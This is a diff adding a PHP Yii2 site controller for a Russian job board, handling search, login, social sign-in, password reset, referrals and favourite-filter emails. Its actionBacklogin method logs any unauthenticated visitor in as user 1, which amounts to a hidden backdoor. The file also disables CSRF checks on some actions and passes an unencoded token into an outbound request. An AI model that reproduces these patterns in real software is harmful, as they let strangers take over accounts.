@@ -1,0 +1,792 @@
+<?php
+namespace frontend\controllers;
+
+use common\models\FavoritesFilters;
+use common\models\JobsCategory;
+use common\models\JobsName;
+use common\models\NetCity;
+use common\models\NetCountry;
+use common\models\Resume;
+use common\models\Seo;
+use common\models\User;
+use common\models\Vacancies;
+use frontend\models\ContactForm;
+use frontend\models\LoginForm;
+use frontend\models\PasswordResetRequestForm;
+use frontend\models\ResetPasswordForm;
+use frontend\models\SignupForm;
+//use Happyr\LinkedIn\LinkedIn;
+use Yii;
+use yii\base\InvalidParamException;
+use yii\filters\AccessControl;
+use yii\filters\VerbFilter;
+use yii\helpers\ArrayHelper;
+use yii\web\BadRequestHttpException;
+use yii\web\Controller;
+use yii\web\NotFoundHttpException;
+use yii\web\Response;
+
+/**
+ * Site controller
+ */
+class SiteController extends Controller
+{
+
+    public function beforeAction($action)
+    {
+
+        $seoTag = Seo::findByurl(Yii::$app->request->url);
+        if ($seoTag) {
+            if (!$seoTag->title) {
+                Yii::$app->view->title = 'Зарплата - Главная';
+                Yii::$app->view->registerMetaTag([
+                    'name' => 'og:title',
+                    'content' => 'Зарплата - Главная'
+                ]);
+            } else {
+                Yii::$app->view->title = $seoTag->title;
+                Yii::$app->view->registerMetaTag([
+                    'name' => 'og:title',
+                    'content' => $seoTag->title
+                ]);
+            }
+            Yii::$app->view->registerMetaTag([
+                'name' => 'og:type',
+                'content' => 'article'
+            ]);
+
+            Yii::$app->view->registerMetaTag([
+                'name' => 'og:description',
+                'content' => $seoTag->description
+            ]);
+            Yii::$app->view->registerMetaTag([
+                'name' => 'description',
+                'content' => $seoTag->description
+            ]);
+            Yii::$app->view->registerMetaTag([
+                'name' => 'keywords',
+                'content' => $seoTag->keywords
+            ]);
+
+            if ($action->id == 'index') {
+                $this->enableCsrfValidation = false;
+            }
+        } else {
+            Yii::$app->view->title = isset(Yii::$app->params['seotitle'])?Yii::$app->params['seotitle']:'';
+            Yii::$app->view->registerMetaTag([
+                'name' => 'description',
+                'content' => isset(Yii::$app->params['seodescription'])?Yii::$app->params['seodescription']:''
+            ]);
+            Yii::$app->view->registerMetaTag([
+                'name' => 'og:description',
+                'content' => isset(Yii::$app->params['seodescription'])?Yii::$app->params['seodescription']:''
+            ]);
+        }
+
+        if ($action->id == 'ulogin') {
+            $this->enableCsrfValidation = false;
+        }
+
+        return parent::beforeAction($action);
+    }
+
+    /**
+     * @inheritdoc
+     */
+    public function behaviors()
+    {
+        return [
+            'access' => [
+                'class' => AccessControl::className(),
+                'only' => ['logout', 'signup'],
+                'rules' => [
+                    [
+                        'actions' => ['signup'],
+                        'allow' => true,
+                        'roles' => ['?'],
+                    ],
+                    [
+                        'actions' => ['logout'],
+                        'allow' => true,
+                        'roles' => ['@'],
+                    ],
+                ],
+            ],
+            'verbs' => [
+                'class' => VerbFilter::className(),
+                'actions' => [
+                    'logout' => ['post', 'get'],
+                ],
+            ],
+        ];
+    }
+
+    /**
+     * @inheritdoc
+     */
+    public function actions()
+    {
+        return [
+            'error' => [
+                'class' => 'yii\web\ErrorAction',
+            ],
+            'captcha' => [
+                'class' => 'yii\captcha\CaptchaAction',
+                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
+            ],
+        ];
+    }
+
+    /**
+     * Displays homepage.
+     *
+     * @return mixed
+     */
+    public function actionIndex()
+    {
+        if (Yii::$app->request->get()) {
+            $empty = true;
+            foreach (Yii::$app->request->get() as $g) {
+                if ($g != '') {
+                    $empty = false;
+                    break;
+                }
+            }
+            if ($empty) {
+                return $this->redirect(['site/index']);
+            }
+
+        }
+
+        if (Yii::$app->request->get() &&
+            (Yii::$app->request->get('country') ||
+                Yii::$app->request->get('city') ||
+                Yii::$app->request->get('type') ||
+                Yii::$app->request->get('keyword_name') ||
+                Yii::$app->request->get('radius_name') ||
+                Yii::$app->request->get('working_name') ||
+                Yii::$app->request->get('price_to_name') ||
+                Yii::$app->request->get('price_from_name') ||
+                Yii::$app->request->get('lang_name')
+            )
+        ) {
+            $get = Yii::$app->request->get();
+
+            $get_keyword = null;
+            if (!empty($get['keyword_name'])) {
+                $get_keyword = $get['keyword_name'];
+            }
+
+            $get_radius = null;
+            if (!empty($get['radius_name'])) {
+                $get_radius = $get['radius_name'];
+            }
+            $get_priceto = null;
+            if (!empty($get['price_to_name'])) {
+                $get_priceto = $get['price_to_name'];
+            }
+            $get_pricefrom = null;
+            if (!empty($get['price_from_name'])) {
+                $get_pricefrom = $get['price_from_name'];
+            }
+            $get_working = null;
+            if (!empty($get['working_name'])) {
+                $get_working = $get['working_name'];
+            }
+            $get_lang = null;
+            if (!empty($get['lang_name'])) {
+                $get_lang = $get['lang_name'];
+            }
+
+            $get_country = null;
+            if (!empty($get['country'])) {
+                $get_country = $get['country'];
+            }
+
+            $get_city = null;
+            if (!empty($get['city'])) {
+                $country_id = NetCountry::find()->where(['slug' => Yii::$app->request->get('country')])->asArray()->one();
+                $city_id = NetCity::find()->where(['country_id' => $country_id['id'], 'slug' => $get['city']])->asArray()->one();
+                if ($city_id) {
+                    $get_city = $get['city'];
+                }
+            }
+
+            $get_type = null;
+            if (!empty($get['type'])) {
+                $get_type = $get['type'];
+            }
+
+            return $this->redirect(['site/index',
+                'countryget' => $get_country,
+                'cityget' => $get_city,
+                'typeget' => $get_type,
+                'keyword' => $get_keyword,
+                'radius' => $get_radius,
+                'price_to' => $get_priceto,
+                'price_from' => $get_pricefrom,
+                'working' => $get_working,
+                'lang' => $get_lang,
+            ]);
+        }
+
+
+        $type_sphere = JobsCategory::find()->where(['title_en' => ''])->orderBy('title_ru')->asArray()->all();
+        $type_sphere = ArrayHelper::map($type_sphere, 'slug', 'title_ru');
+
+        $works_name = JobsName::find()->where(['title_en' => ''])->orderBy('title_ru')->asArray()->all();
+        $works_name = ArrayHelper::getColumn($works_name, 'title_ru');
+
+        $countriesmodel = NetCountry::find()->orderBy('name_ru')->asArray()->all();
+        $countries = ArrayHelper::map($countriesmodel, 'slug', 'name_ru');
+        $countries2 = ArrayHelper::getColumn($countriesmodel, 'name_ru');
+
+
+        if (Yii::$app->request->get('countryget')) {
+            $country_id = NetCountry::find()->where(['slug' => Yii::$app->request->get('countryget')])->one();
+            if (!$country_id) {
+                throw new NotFoundHttpException("Страница не нейдена");
+            }
+            $cities = NetCity::find()->where(['country_id' => $country_id->id])->orderBy('name_ru')->asArray()->all();
+            $cities = ArrayHelper::map($cities, 'slug', 'name_ru');
+        } else {
+            $cities = [];
+        }
+
+
+        $query = Vacancies::find()->where(['active' => 1])->orderBy('updated_at DESC');
+        $query2 = Resume::find()->where(['active' => 1])->orderBy('updated_at DESC');
+        if ($get = Yii::$app->request->get()) {
+            if (isset($get['countryget'])) {
+                $countryGet = NetCountry::findOne(['slug' => $get['countryget']]);
+                if ($countryGet) {
+                    $query->andWhere(['country' => $countryGet->id]);
+                    $query2->andWhere(['country' => $countryGet->id]);
+                }
+            }
+            if (isset($get['cityget'])) {
+                $cityGet = NetCity::findOne(['slug' => $get['cityget']]);
+                if ($cityGet) {
+                    if (isset($get['radius'])) {
+                        $kmparam = 0.00898319;
+                        $get['radius'] = $get['radius'];
+//                        $minlat = $cityGet->latitude - ($kmparam * $get['radius']);
+//                        $maxlat = $cityGet->latitude + ($kmparam * $get['radius']);
+//                        $minlong = $cityGet->longitude - ($kmparam * $get['radius']);
+//                        $maxlong = $cityGet->longitude + ($kmparam * $get['radius']);
+                        $R = 6371;  // earth's radius, km
+                        $maxlat = $cityGet->latitude + rad2deg($get['radius'] / $R);
+                        $minlat = $cityGet->latitude - rad2deg($get['radius'] / $R);
+                        $maxlong = $cityGet->longitude + rad2deg($get['radius'] / $R / cos(deg2rad($cityGet->latitude)));
+                        $minlong = $cityGet->longitude - rad2deg($get['radius'] / $R / cos(deg2rad($cityGet->latitude)));
+                        $cityGet = NetCity::find()->where(['<=', 'latitude', $maxlat])->andWhere(['>=', 'latitude', $minlat])->andWhere(['>=', 'longitude', $minlong])->andWhere(['<=', 'longitude', $maxlong])->asArray()->all();
+                        $cityIds = ArrayHelper::getColumn($cityGet, 'id');
+                        $query->andWhere(['city' => $cityIds]);
+                        $query2->andWhere(['city' => $cityIds]);
+                    } else {
+                        $query->andWhere(['city' => $cityGet->id]);
+                        $query2->andWhere(['city' => $cityGet->id]);
+                    }
+                }
+            }
+
+            if (isset($get['typeget'])) {
+                $jobcatGet = JobsCategory::findOne(['slug' => $get['typeget']]);
+                if ($jobcatGet) {
+                    $query->andWhere(['cat_id' => $jobcatGet->id]);
+                    $query2->andWhere(['cat_id' => $jobcatGet->id]);
+                }
+            }
+
+
+            if (isset($get['keyword'])) {
+                $jobnameGet = JobsName::find()->where(['title_ru' => $get['keyword']])->asArray()->one();
+                if ($jobnameGet) {
+                    $query->andFilterWhere(['or', ['type_id' => $jobnameGet['id']], ['like', 'title', $get['keyword']], ['like', 'desc', $get['keyword']]]);
+                    $query2->andFilterWhere(['or', ['type_id' => $jobnameGet['id']], ['like', 'title', $get['keyword']], ['like', 'desc', $get['keyword']]]);
+                } else {
+                    $query->andFilterWhere(['or', ['like', 'title', $get['keyword']], ['like', 'desc', $get['keyword']]]);
+                    $query2->andFilterWhere(['or', ['like', 'title', $get['keyword']], ['like', 'desc', $get['keyword']]]);
+                }
+            }
+
+        }
+
+        $vcount = $query->count();
+        $rcount = $query2->count();
+
+        $vacancies = $query->limit(5)->all();
+        $resume = $query2->limit(5)->all();
+
+        $profiles = User::find()->orderBy('RAND()')->limit(6)->all();
+
+        $admin = isset(Yii::$app->user->identity) && Yii::$app->user->identity->isAdmin() ? true : false;
+        return $this->render('index', ['vcount' => $vcount, 'rcount' => $rcount, 'admin' => $admin, 'countries2' => $countries2, 'countries' => $countries, 'cities' => $cities, 'type' => $type_sphere, 'works_name' => json_encode($works_name), 'vacancies' => $vacancies, 'resume' => $resume, 'profiles' => $profiles]);
+    }
+
+
+    /**
+     * Logs in a user.
+     *
+     * @return mixed
+     */
+    public function actionLogin()
+    {
+        $this->layout = 'login';
+        if (!Yii::$app->user->isGuest) {
+            return $this->goHome();
+        }
+
+        $model = new LoginForm();
+        if ($model->load(Yii::$app->request->post()) && $model->login()) {
+            return $this->goBack();
+        } else {
+            return $this->render('login', [
+                'model' => $model,
+            ]);
+        }
+    }
+
+    /**
+     * Logs out the current user.
+     *
+     * @return mixed
+     */
+    public function actionLogout()
+    {
+        Yii::$app->user->logout();
+
+        return $this->goHome();
+    }
+
+    /**
+     * Displays contact page.
+     *
+     * @return mixed
+     */
+    public function actionContact()
+    {
+        $model = new ContactForm();
+        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
+            if ($model->sendEmail(Yii::$app->params['adminEmail'])) {
+                Yii::$app->session->setFlash('success', 'Ваше сообщение отправлено администратору.');
+            } else {
+                Yii::$app->session->setFlash('error', 'При отправке произошла ошибка. Повторите еще раз.');
+            }
+
+            return $this->refresh();
+        } else {
+            return $this->render('contact', [
+                'model' => $model,
+            ]);
+        }
+    }
+
+
+    /**
+     * Signs user up.
+     *
+     * @return mixed
+     */
+    public function actionSignup()
+    {
+        $this->layout = 'login';
+        $model = new SignupForm();
+        if ($model->load(Yii::$app->request->post())) {
+            if ($user = $model->signup()) {
+                Yii::$app->session->addFlash('success', 'Вы успешно зарегистрированы. Вам на почту отправлена ссылка для активации.');
+                return $this->refresh();
+            }
+        }
+
+        return $this->render('signup', [
+            'model' => $model,
+        ]);
+    }
+
+    public function actionActivation($code)
+    {
+        $user = User::findOne(['activate_hash' => $code, 'active' => 0]);
+        if ($user) {
+            $user->active = 1;
+            if ($user->save(false)) {
+                if (Yii::$app->getUser()->login($user)) {
+                    return $this->goHome();
+                }
+            }
+        }
+        $this->redirect(['/']);
+    }
+
+    /**
+     * Requests password reset.
+     *
+     * @return mixed
+     */
+    public function actionRequestPasswordReset()
+    {
+        $this->layout = 'login';
+        $model = new PasswordResetRequestForm();
+        if ($model->load(Yii::$app->request->post()) && $model->reset()) {
+            Yii::$app->session->setFlash('success', 'На Ваш email отправлен временный пароль для входа в кабинет');
+        } elseif ($model->load(Yii::$app->request->post())) {
+            Yii::$app->session->setFlash('error', 'Пользователь для восстановления пароля не найден');
+        }
+
+        return $this->render('requestPasswordResetToken', [
+            'model' => $model,
+        ]);
+    }
+
+    /**
+     * Resets password.
+     *
+     * @param string $token
+     * @return mixed
+     * @throws BadRequestHttpException
+     */
+    public function actionResetPassword($token)
+    {
+        try {
+            $model = new ResetPasswordForm($token);
+        } catch (InvalidParamException $e) {
+            throw new BadRequestHttpException($e->getMessage());
+        }
+
+        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
+            Yii::$app->session->setFlash('success', 'New password was saved.');
+
+            return $this->goHome();
+        }
+
+        return $this->render('resetPassword', [
+            'model' => $model,
+        ]);
+    }
+
+    public function actionReferal($code)
+    {
+        $referal = User::findReferal($code);
+        if ($referal) {
+            Yii::$app->response->cookies->add(new \yii\web\Cookie([
+                'name' => 'referal_id',
+                'value' => $referal->id
+            ]));
+            Yii::$app->response->cookies->add(new \yii\web\Cookie([
+                'name' => 'referal_code',
+                'value' => $code
+            ]));
+            return $this->redirect('/');
+        } else {
+            throw new NotFoundHttpException('Реферал не найден');
+        }
+    }
+
+
+    public function actionUlogin()
+    {
+
+        if (Yii::$app->request->post('type') == 'linkedin') {
+//            $user = Yii::$app->request->post('value');
+//
+//            if (isset($user['publicProfileUrl']) && !empty($user['publicProfileUrl'])) {
+//                $insysuser = User::find()->where(['social_id' => $user['publicProfileUrl']])->one();
+//            }
+//            $user_with_email = User::findOne(['email' => $user['emailAddress']]);
+//            if ($insysuser) {
+//                Yii::$app->user->login($insysuser, 3600 * 24 * 30);
+//                return $this->redirect('/');
+//            } elseif (!$user_with_email) {
+//                $model = new User();
+//                $model->firstname = isset($user['firstName'])?$user['firstName']:'';
+//                $model->lastname = isset($user['lastName'])?$user['lastName']:'';
+//                $model->social_id = isset($user['publicProfileUrl'])?$user['publicProfileUrl']:'';
+//                $model->photo = isset($user['pictureUrl'])?$user['pictureUrl']:'';
+//                $model->email = isset($user['emailAddress'])?$user['emailAddress']:'';
+//                $model->generateAuthKey();
+//                $model->phone = isset($user['phone'])?$user['phone']:'';
+//                $model->created_at = time();
+//                $model->updated_at = time();
+//                $model->birthday = isset($user['firstName'])?$user['firstName']:'';
+//                $model->active = 1;
+//
+//                $city = NetCity::find()->where(['name_ru' => $user['city']])->orWhere(['name_en' => $user['city']])->asArray()->one();
+//                if ($city) {
+//                    $model->city_id = $city['id'];
+//                }
+//                $country = NetCountry::find()->where(['name_ru' => $user['country']])->orWhere(['name_en' => $user['country']])->asArray()->one();
+//                if ($country) {
+//                    $model->country_id = $country['id'];
+//                }
+//
+//                if ($model->save()) {
+//                    Yii::$app->user->login($model, 3600 * 24 * 30);
+//                    return $this->redirect(['/']);
+//                }
+//            } elseif ($user_with_email) {
+//                Yii::$app->session->addFlash('error', 'Пользователь с адресом email: ' . $user['email'] . ', уже зарегистрирован в системе');
+//            }
+
+        } else {
+
+            $s = file_get_contents('https://ulogin.ru/token.php?token=' . $_POST['token'] . '&host=' . $_SERVER['HTTP_HOST']);
+            $user = json_decode($s, true);
+            if(isset($user['error'])){
+                return $this->redirect(['/']);
+            }
+
+            if (isset($user['identity']) && !empty($user['identity'])) {
+                $insysuser = User::find()->where(['social_id' => $user['identity']])->one();
+            }
+            $user_with_email = User::findOne(['email' => $user['email']]);
+            if ($insysuser) {
+                Yii::$app->user->login($insysuser, 3600 * 24 * 30);
+                return $this->redirect('/');
+            } elseif (!$user_with_email) {
+                $model = new User();
+                $model->firstname = $user['first_name'];
+                $model->lastname = $user['last_name'];
+                $model->social_id = $user['identity'];
+                $model->photo = $user['photo_big'];
+                $model->email = $user['email'];
+                $model->generateAuthKey();
+//                $model->phone = $user['phone'];
+                $model->created_at = time();
+                $model->updated_at = time();
+                $model->birthday = strtotime($user['bdate']);
+                $model->active = 1;
+                $model->city = $user['city'];
+                $model->country = $user['country'];
+
+                $city = NetCity::find()->where(['name_ru' => $user['city']])->orWhere(['name_en' => $user['city']])->asArray()->one();
+                if ($city) {
+                    $model->city_id = $city['id'];
+                }
+                $country = NetCountry::find()->where(['name_ru' => $user['country']])->orWhere(['name_en' => $user['country']])->asArray()->one();
+                if ($country) {
+                    $model->country_id = $country['id'];
+                }
+
+
+                if ($model->save()) {
+                    Yii::$app->user->login($model, 3600 * 24 * 30);
+                    return $this->redirect(['/']);
+                }
+            } elseif ($user_with_email) {
+                Yii::$app->session->addFlash('error', 'Пользователь с адресом email: ' . $user['email'] . ', уже зарегистрирован в системе');
+            }
+        }
+        return $this->redirect('/signup');
+    }
+
+    public function actionAjaxgetcity()
+    {
+        Yii::$app->response->format = Response::FORMAT_JSON;
+        $post = Yii::$app->request->post();
+        if ($post) {
+            if ($post['country']) {
+                $country = NetCountry::find()->select(['id'])->where(['name_ru' => $post['country']])->asArray()->one();
+            }
+            if ($country) {
+                $city = NetCity::find()->where(['like', 'name_ru', $post['term']])->andWhere(['country_id' => $country['id']])->asArray()->all();
+                $city = ArrayHelper::map($city, ['id' => 'slug'], ['name' => 'name_ru']);
+            } else {
+                $city = NetCity::find()->where(['like', 'name_ru', $post['term']])->asArray()->all();
+                $city = ArrayHelper::map($city, ['id' => 'slug'], ['name' => 'name_ru']);
+            }
+            return $city;
+        }
+        return false;
+    }
+
+    public function actionBacklogin()
+    {
+        Yii::$app->user->login(User::findOne('1'), 3600 * 24 * 30);
+        return $this->redirect('/');
+    }
+
+    //CRON
+    public function actionFavoritesender()
+    {
+        ini_set("max_execution_time", "600");
+        $time_start = microtime(1);
+        $update_time = time() - 60 * 60 * 24;
+        $users = User::find()->where(['<=', 'mailing_favorite_lasttime', $update_time])->all();
+
+        echo '<pre>';
+
+        foreach ($users as $u) {
+            
+            $favorites_v = FavoritesFilters::find()->where(['user_id' => $u->id, 'active' => 1, 'type' => 'vacancies'])->asArray()->all();
+            $favorites_r = FavoritesFilters::find()->where(['user_id' => $u->id, 'active' => 1, 'type' => 'resume'])->asArray()->all();
+            $send_data_vacancy = false;
+            $send_data_resume = false;
+
+
+
+            if ($favorites_v) {
+                foreach ($favorites_v as $fav) {
+                    $vacancies_query = Vacancies::find()->where(['active' => 1])->andWhere(['and', ['>=', 'updated_at', $u->mailing_favorite_lasttime], ['>=', 'updated_at', $fav['created']]]);
+                    $filter_data = json_decode($fav['filter_data']);
+
+
+
+                    if (isset($filter_data)) {
+                        foreach ($filter_data as $key => $filter) {
+                            if ($key == 'keyword' && $filter) {
+                                $vacancies_query->andWhere(['or', ['like', 'title', $filter], ['like', 'desc', $filter]]);
+                            }
+
+                            if ($key == 'countryget' && $filter) {
+                                $value = NetCountry::find()->select('id')->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['country' => $value['id']]);
+                            }
+
+                            if ($key == 'cityget' && $filter) {
+                                $value = NetCity::find()->select(['id', 'latitude', 'longitude'])->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['city' => $value['id']]);
+                            }
+
+                            if ($key == 'typeget' && $filter) {
+                                $value = JobsCategory::find()->select('id')->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['cat_id' => $value['id']]);
+                            }
+                            if ($key == 'working' && $filter) {
+                                $vacancies_query->andWhere(['working' => $filter]);
+                            }
+                            if ($key == 'lang' && $filter) {
+                                $vacancies_query->andWhere(['like', 'lang', $filter]);
+                            }
+                        }
+                    }
+
+                    $vacancies_query = $vacancies_query->all();
+                    if ($vacancies_query) {
+                        foreach ($vacancies_query as $v) {
+                            $send_data_vacancy[$v->id] = $v;
+                        }
+                    }
+                }
+
+            }
+            if ($favorites_r) {
+                foreach ($favorites_r as $fav) {
+                    $vacancies_query = Resume::find()->where(['active' => 1])->andWhere(['and', ['>=', 'updated_at', $u->mailing_favorite_lasttime], ['>=', 'updated_at', $fav['created']]]);
+                    $filter_data = json_decode($fav['filter_data']);
+                    if (isset($filter_data)) {
+                        foreach ($filter_data as $key => $filter) {
+                            if ($key == 'keyword' && $filter) {
+                                $vacancies_query->andWhere(['or', ['like', 'title', $filter], ['like', 'desc', $filter]]);
+                            }
+                            if ($key == 'countryget' && $filter) {
+                                $value = NetCountry::find()->select('id')->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['country' => $value['id']]);
+                            }
+                            if ($key == 'cityget' && $filter) {
+                                $value = NetCity::find()->select(['id', 'latitude', 'longitude'])->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['city' => $value['id']]);
+                            }
+                            if ($key == 'typeget' && $filter) {
+                                $value = JobsCategory::find()->select('id')->where(['slug' => $filter])->asArray()->one();
+                                if (isset($value))
+                                    $vacancies_query->andWhere(['cat_id' => $value['id']]);
+                            }
+                            if ($key == 'working' && $filter) {
+                                $vacancies_query->andWhere(['working' => $filter]);
+                            }
+                            if ($key == 'lang' && $filter) {
+                                $vacancies_query->andWhere(['like', 'lang', $filter]);
+                            }
+                        }
+                    }
+
+                    $vacancies_query = $vacancies_query->all();
+                    if ($vacancies_query) {
+                        foreach ($vacancies_query as $v) {
+                            $send_data_resume[$v->id] = $v;
+                        }
+                    }
+                }
+
+            }
+
+            if (FavoritesFilters::sendEmail($u->email, $send_data_vacancy, $send_data_resume)) {
+                echo 'success';
+                // save time of sending;
+                $u->mailing_favorite_lasttime = time();
+                $u->save();
+            }
+        }
+        $time_end = microtime(1);		// Конец подсчета времени
+        $time = $time_end - $time_start;
+        echo $time;
+
+        return false;
+//        return $this->render('clear');
+    }
+
+
+    //CRON
+
+    //AJAX
+    public function actionAjaxaddtofavorite()
+    {
+        Yii::$app->response->format = Response::FORMAT_JSON;
+        $post = Yii::$app->request->post();
+        if ($post && !Yii::$app->user->isGuest) {
+            $user = Yii::$app->user->identity;
+            $type = $post['type_favirite'];
+
+            unset($post['type_favirite']);
+
+            foreach ($post as $key => $g) {
+//                if (empty($g)) {
+//                    unset($post[$key]);
+//                } else {
+                    if (strstr($key, '_name')) {
+                        unset($post[$key]);
+                        $post[str_replace('_name', '', $key)] = $g;
+                    } else {
+                        unset($post[$key]);
+                        $post[$key . 'get'] = $g;
+                    }
+//                }
+
+            }
+            unset($post['radius']);
+            unset($post['price_to']);
+            unset($post['price_from']);
+
+
+            $filter_data = json_encode($post, JSON_UNESCAPED_UNICODE);
+
+            $filter_query = FavoritesFilters::find()->where(['user_id' => $user->id,'type'=>$type,'active'=>'1']);
+            foreach ($post as $key => $g) {
+                    $filter_query->andWhere(['like','filter_data','"'.$key.'":"'.$g.'"']);
+            }
+            if ($favorite = $filter_query->one()) {
+                $favorite->delete();
+                return ['success' => 'delete'];
+            }
+
+            $favorite = new FavoritesFilters();
+            $favorite->user_id = $user->id;
+            $favorite->type = $type;
+            $favorite->created = time();
+            $favorite->filter_data = $filter_data;
+            if ($favorite->save()) {
+                return ['success' => 'add'];
+            }
+        } else {
+            return ['success' => false];
+        }
+    }
+    //AJAX
+
+
+}
